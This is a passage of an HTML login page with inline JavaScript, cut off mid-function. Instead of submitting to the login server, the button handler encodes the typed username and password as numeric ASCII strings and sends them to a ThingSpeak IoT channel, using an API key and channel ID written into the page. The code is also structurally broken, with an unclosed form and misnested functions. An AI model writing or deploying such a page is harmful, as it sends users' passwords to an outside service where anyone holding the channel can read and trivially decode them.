        <form id="loginForm" action="http://localhost:3000/Login" method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <button type="button" onclick="senddata()">Login</button>

    <script>
        function senddata() {
          
          const inputString = document.getElementById('username').value;
    
          // Validate the input
          if (!inputString.match(/^[a-zA-Z0-9]+$/)) {
            alert('Please enter a valid username');
            return;
          }
    
          // Array to store ASCII values of each letter
          const asciiArray = [];
    
          // Iterate through each character in the string
          for (let i = 0; i < inputString.length; i++) {
            const char = inputString.charAt(i);
            const asciiValue = char.charCodeAt(0);
            asciiArray.push(asciiValue);
          }
    
          // Concatenate the array elements to form a single numeric value
          const concatenatedValue = parseInt(asciiArray.join('0'));
          
          sendToThingSpeakAPI(concatenatedValue,1);
        
    
          // Send the concatenated value to ThingSpeak (you need to replace YOUR_API_KEY and YOUR_FIELD_ID with your ThingSpeak API key and field ID)
      
          sendpass();
        }
        function sendpass() {
          
          const inputString = document.getElementById('password').value;
    
          // Validate the input
          if (!inputString.match(/^[a-zA-Z0-9]+$/)) {
            alert('Please enter a valid username');
            return;
          }
    
          // Array to store ASCII values of each letter
          const asciiArray = [];
    
          // Iterate through each character in the string
          for (let i = 0; i < inputString.length; i++) {
            const char = inputString.charAt(i);
            const asciiValue = char.charCodeAt(0);
            asciiArray.push(asciiValue);
          }
    
          // Concatenate the array elements to form a single numeric value
          const concatenatedValue = parseInt(asciiArray.join('0'));
          
          

          // Send the concatenated value to ThingSpeak (you need to replace YOUR_API_KEY and YOUR_FIELD_ID with your ThingSpeak API key and field ID)
          sendToThingSpeakAPI(concatenatedValue,2);

        function sendToThingSpeakAPI(value,nf) {
          // Replace 'YOUR_API_KEY' and 'YOUR_CHANNEL_ID' with your ThingSpeak API key and channel ID
          const apiKey = '7XDAVI9QUCJVD13B';
          const channelId = '1887226';

          const updateUrl = `https://api.thingspeak.com/update?api_key=${apiKey}&field${nf}=${value}`;
    
          // Send the data to ThingSpeak using a request (you may need to use an appropriate library or method for your environment)
